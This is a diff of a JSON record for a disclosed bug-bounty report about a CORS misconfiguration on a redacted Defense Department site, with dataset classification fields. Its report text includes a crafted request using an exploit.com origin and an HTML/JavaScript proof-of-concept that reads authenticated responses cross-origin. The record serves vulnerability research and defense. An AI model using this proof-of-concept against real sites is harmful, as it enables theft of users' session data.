@@ -1,48 +1,48 @@
 {
-    "reported_to": "U.S. Dept Of Defense",
-    "reported_by": "jarvis0x1 ",
-    "title": "[\u2588\u2588\u2588\u2588\u2588\u2588] Cross-origin resource sharing misconfiguration (CORS)",
-    "content": "\nHi!\nIn this report I want to describe High level bug which can seriously compromise a user account.\nIf I am authorize on this site, I can steal user's sessions, some personal information or do some action.\nSteps for reproduce\n1) Send this request\nCode 439 Bytes\n1GET /api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link HTTP/1.1\n2Host: www.\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n5Accept-Language: ru,en-US;q=0.7,en;q=0.3\n6Accept-Encoding: gzip, deflate\n7Origin: exploit.com\n8Connection: close\n9Upgrade-Insecure-Requests: 1\n10Cache-Control: max-age=0\nIn response headers you can see headers\nCode 79 Bytes\n1Access-Control-Allow-Credentials: true\n2Access-Control-Allow-Origin: exploit.com\n{F395049}\nSo you can write exploit:\nCode 867 Bytes\n1<!DOCTYPE html>\n2<html>\n3   <head>\n4      <script>\n5         function cors() {\n6\t        var xhttp = new XMLHttpRequest();\n7\t\t        xhttp.onreadystatechange = function() {\n8\t\t\t        if (this.readyState == 4 && this.status == 200) {\n9\t\t\t        \tdocument.getElementById(\"emo\").innerHTML = alert(this.responseText);\n10\t        }\n11         };\n12         xhttp.open(\"GET\", \"https://www.\u2588\u2588\u2588/api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link\", true);\n13         xhttp.withCredentials = true;\n14         xhttp.send();\n15         }\n16      </script>\n17   </head>\n18   <body>\n19      <center>\n20      <h2>CORS PoC Exploit </h2>\n21      <h3>created by <a href=\"https://twitter.com/Jarvis7717\">@Jarvis</a></h3>\n22      <h3>Show full content of page</h3>\n23      <div id=\"demo\">\n24         <button type=\"button\" onclick=\"cors()\">Exploit</button>\n25      </div>\n26   </body>\n27</html>\nResult:\n{F395063}\n### How to fix\nRather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.\nImpact\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "jarvis0x1 ",
+  "title": "[\u2588\u2588\u2588\u2588\u2588\u2588] Cross-origin resource sharing misconfiguration (CORS)",
+  "content": "\nHi!\nIn this report I want to describe High level bug which can seriously compromise a user account.\nIf I am authorize on this site, I can steal user's sessions, some personal information or do some action.\nSteps for reproduce\n1) Send this request\nCode 439 Bytes\n1GET /api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link HTTP/1.1\n2Host: www.\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n5Accept-Language: ru,en-US;q=0.7,en;q=0.3\n6Accept-Encoding: gzip, deflate\n7Origin: exploit.com\n8Connection: close\n9Upgrade-Insecure-Requests: 1\n10Cache-Control: max-age=0\nIn response headers you can see headers\nCode 79 Bytes\n1Access-Control-Allow-Credentials: true\n2Access-Control-Allow-Origin: exploit.com\n{F395049}\nSo you can write exploit:\nCode 867 Bytes\n1<!DOCTYPE html>\n2<html>\n3   <head>\n4      <script>\n5         function cors() {\n6\t        var xhttp = new XMLHttpRequest();\n7\t\t        xhttp.onreadystatechange = function() {\n8\t\t\t        if (this.readyState == 4 && this.status == 200) {\n9\t\t\t        \tdocument.getElementById(\"emo\").innerHTML = alert(this.responseText);\n10\t        }\n11         };\n12         xhttp.open(\"GET\", \"https://www.\u2588\u2588\u2588/api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link\", true);\n13         xhttp.withCredentials = true;\n14         xhttp.send();\n15         }\n16      </script>\n17   </head>\n18   <body>\n19      <center>\n20      <h2>CORS PoC Exploit </h2>\n21      <h3>created by <a href=\"https://twitter.com/Jarvis7717\">@Jarvis</a></h3>\n22      <h3>Show full content of page</h3>\n23      <div id=\"demo\">\n24         <button type=\"button\" onclick=\"cors()\">Exploit</button>\n25      </div>\n26   </body>\n27</html>\nResult:\n{F395063}\n### How to fix\nRather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.\nImpact\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Improper Access Control - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1548700260,
+  "report_url": "https://hackerone.com/reports/470298",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a crafted HTTP request with an arbitrary 'Origin' header (e.g., exploit.com) to the vulnerable endpoint."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Improper Access Control - Generic"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1548700260,
-    "report_url": "https://hackerone.com/reports/470298",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Send a crafted HTTP request with an arbitrary 'Origin' header (e.g., exploit.com) to the vulnerable endpoint."
-        ],
-        [
-            2,
-            "Observe that the server responds with 'Access-Control-Allow-Credentials: true' and reflects the attacker's origin in 'Access-Control-Allow-Origin'."
-        ]
-    ],
-    "vuln_description": "The vulnerability is a misconfigured CORS (Cross-Origin Resource Sharing) policy that allows arbitrary origins to access sensitive data when combined with 'Access-Control-Allow-Credentials: true'. This enables attackers to steal authenticated user data via a malicious website by making cross-origin requests that include the victim's credentials.",
-    "reason": "The attack is straightforward, involving only a single request/response interaction with no complex state manipulation or novel logic. The vulnerability is easily detectable by testing arbitrary Origin headers and observing the server's CORS response headers.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": true
-    }
+    [
+      2,
+      "Observe that the server responds with 'Access-Control-Allow-Credentials: true' and reflects the attacker's origin in 'Access-Control-Allow-Origin'."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a misconfigured CORS (Cross-Origin Resource Sharing) policy that allows arbitrary origins to access sensitive data when combined with 'Access-Control-Allow-Credentials: true'. This enables attackers to steal authenticated user data via a malicious website by making cross-origin requests that include the victim's credentials.",
+  "reason": "The attack is straightforward, involving only a single request/response interaction with no complex state manipulation or novel logic. The vulnerability is easily detectable by testing arbitrary Origin headers and observing the server's CORS response headers.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The CORS misconfiguration allows cross-origin requests with credentials, which can be detected by analyzing HTTP responses for Access-Control-Allow-Credentials and Access-Control-Allow-Origin headers. The methodology involves checking responses for sensitive headers that could indicate misconfigurations, which is covered in the detection method.",
+    "is_detectable": true
+  }
 }
